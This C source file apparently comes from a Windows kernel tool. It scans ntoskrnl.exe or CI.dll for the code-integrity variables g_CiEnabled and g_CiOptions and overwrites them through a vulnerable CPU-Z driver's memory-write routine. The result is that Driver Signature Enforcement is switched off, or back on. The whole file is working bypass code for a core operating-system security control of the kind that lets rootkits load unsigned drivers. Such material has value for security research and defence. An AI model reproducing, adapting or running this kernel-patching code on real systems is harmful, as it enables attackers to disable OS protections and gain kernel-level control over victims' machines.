/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018
*
*  TITLE:       CI.C
*
*  VERSION:     1.00
*
*  DATE:        10 Feb 2018
*
*  CI related routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* QueryCiEnabled
*
* Purpose:
*
* Find g_CiEnabled variable address.
*
*/
LONG QueryCiEnabled(
    _In_ PVOID MappedBase,
    _In_ SIZE_T SizeOfImage,
    _Inout_ ULONG_PTR *KernelBase
)
{
    SIZE_T  c;
    LONG    rel = 0;

    for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
        if (*(PDWORD)((PBYTE)MappedBase + c) == 0x1d8806eb) {
            rel = *(PLONG)((PBYTE)MappedBase + c + 4);
            *KernelBase = *KernelBase + c + 8 + rel;
            break;
        }
    }

    return rel;
}

/*
* QueryCiOptions
*
* Purpose:
*
* Find g_CiOptions variable address.
*
*/
LONG QueryCiOptions(
    _In_ PVOID MappedBase,
    _Inout_ ULONG_PTR *KernelBase
)
{
    PBYTE        CiInitialize = NULL;
    ULONG        c, j = 0;
    LONG         rel = 0;
    hde64s hs;

    CiInitialize = (PBYTE)GetProcAddress(MappedBase, "CiInitialize");
    if (CiInitialize == NULL)
        return 0;

    if (g_NtBuildNumber > 16199) {

        c = 0;
        j = 0;
        do {

            /* call CipInitialize */
            if (CiInitialize[c] == 0xE8)
                j++;

            if (j > 1) {
                rel = *(PLONG)(CiInitialize + c + 1);
                break;
            }

            hde64_disasm(CiInitialize + c, &hs);
            if (hs.flags & F_ERROR)
                break;
            c += hs.len;

        } while (c < 256);

    }
    else {

        c = 0;
        do {

            /* jmp CipInitialize */
            if (CiInitialize[c] == 0xE9) {
                rel = *(PLONG)(CiInitialize + c + 1);
                break;
            }
            hde64_disasm(CiInitialize + c, &hs);
            if (hs.flags & F_ERROR)
                break;
            c += hs.len;

        } while (c < 256);

    }

    CiInitialize = CiInitialize + c + 5 + rel;
    c = 0;
    do {

        if (*(PUSHORT)(CiInitialize + c) == 0x0d89) {
            rel = *(PLONG)(CiInitialize + c + 2);
            break;
        }
        hde64_disasm(CiInitialize + c, &hs);
        if (hs.flags & F_ERROR)
            break;
        c += hs.len;

    } while (c < 256);

    CiInitialize = CiInitialize + c + 6 + rel;

    *KernelBase = *KernelBase + CiInitialize - (PBYTE)MappedBase;

    return rel;
}

/*
* ciQueryVariable
*
* Purpose:
*
* Find variable address.
* Depending on NT version search in ntoskrnl.exe or ci.dll
*
*/
ULONG_PTR ciQueryVariable(
    VOID
)
{
    LONG rel = 0;
    SIZE_T SizeOfImage = 0;
    ULONG_PTR Result = 0, ModuleKernelBase = 0;
    CHAR *szModuleName;
    WCHAR *wszErrorEvent, *wszSuccessEvent;
    PVOID MappedBase = NULL;

    CHAR szFullModuleName[MAX_PATH * 2];

    if (g_NtBuildNumber < 9200) {
        szModuleName = NTOSKRNL_EXE;
        wszErrorEvent = TEXT("\r\n[!] ntoskrnl.exe loaded image base not recognized\r\n");
        wszSuccessEvent = TEXT("\r\n[+] ntoskrnl.exe loaded for pattern search");
    }
    else {
        szModuleName = CI_DLL;
        wszErrorEvent = TEXT("\r\n[!] CI.dll loaded image base not recognized\r\n");
        wszSuccessEvent = TEXT("\r\n[+] CI.dll loaded for pattern search");
    }

    
    ModuleKernelBase = supGetModuleBaseByName(szModuleName);
    if (ModuleKernelBase == 0) {
        supPrintText(wszErrorEvent);
        return 0;
    }

    szFullModuleName[0] = 0;
    if (!GetSystemDirectoryA(szFullModuleName, MAX_PATH))
        return 0;
    _strcat_a(szFullModuleName, "\\");
    _strcat_a(szFullModuleName, szModuleName);

    MappedBase = LoadLibraryExA(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (MappedBase) {

        supPrintText(wszSuccessEvent);

        if (g_NtBuildNumber < 9200) {
            rel = QueryCiEnabled(
                MappedBase,
                SizeOfImage,
                &ModuleKernelBase);

        }
        else {
            rel = QueryCiOptions(
                MappedBase,
                &ModuleKernelBase);
        }

        if (rel != 0) {
            Result = ModuleKernelBase;
        }
        FreeLibrary(MappedBase);
    }
    else {

        //
        // Output error.
        //
        if (g_NtBuildNumber < 9200) {
            wszErrorEvent = TEXT("\r\n[!] Cannot load ntoskrnl.exe\r\n");
        }
        else {
            wszErrorEvent = TEXT("\r\n[!] Cannot load CI.dll\r\n");
        }

        supPrintText(wszErrorEvent);
    }

    return Result;
}

/*
* ControlDSE
*
* Purpose:
*
* Change ntoskrnl.exe g_CiEnabled or CI.dll g_CiOptions state.
*
*/
BOOL ControlDSE(
    _In_ BOOL EnableDSE
)
{
    BOOL bResult = FALSE;
    ULONG_PTR CiAddress;

    ULONG Value;

    WCHAR szMsg[MAX_PATH];

    ULONG returnLength = 0;
    NTSTATUS status;
    SYSTEM_CODEINTEGRITY_INFORMATION state;

    state.CodeIntegrityOptions = 0;
    state.Length = sizeof(state);

    status = NtQuerySystemInformation(SystemCodeIntegrityInformation, 
        (PVOID)&state, sizeof(SYSTEM_CODEINTEGRITY_INFORMATION), 
        &returnLength);
    
    if (NT_SUCCESS(status)) {
        if (state.CodeIntegrityOptions & CODEINTEGRITY_OPTION_ENABLED) {
            supPrintText(TEXT("\r\n[+] System reports CodeIntegrityOption Enabled"));
        }
    }

    //
    // Assume variable is in nonpaged .data section.
    //

    CiAddress = ciQueryVariable();
    if (CiAddress == 0) {
        supPrintText(TEXT("\r\n[!] Cannot query CI variable address"));
    } else {

        _strcpy(szMsg, TEXT("\r\n[+] Writing to address 0x"));
        u64tohex(CiAddress, _strend(szMsg));
        supPrintText(szMsg);

        if (EnableDSE) {
            if (g_NtBuildNumber < 9200) 
                Value = 1;   //simple bool flag
            else
                Value = 6;
            bResult = cpuz_WriteVirtualMemory((DWORD_PTR)CiAddress, &Value, sizeof(Value));
        }
        else {
            Value = 0;
            bResult = cpuz_WriteVirtualMemory((DWORD_PTR)CiAddress, &Value, sizeof(Value));
        }
        if (bResult) {
            supPrintText(TEXT("\r\n[+] Kernel memory patched"));
        }
        else {
            supPrintText(TEXT("\r\n[!] Error, kernel memory not patched"));
        }
    }

    return bResult;
}

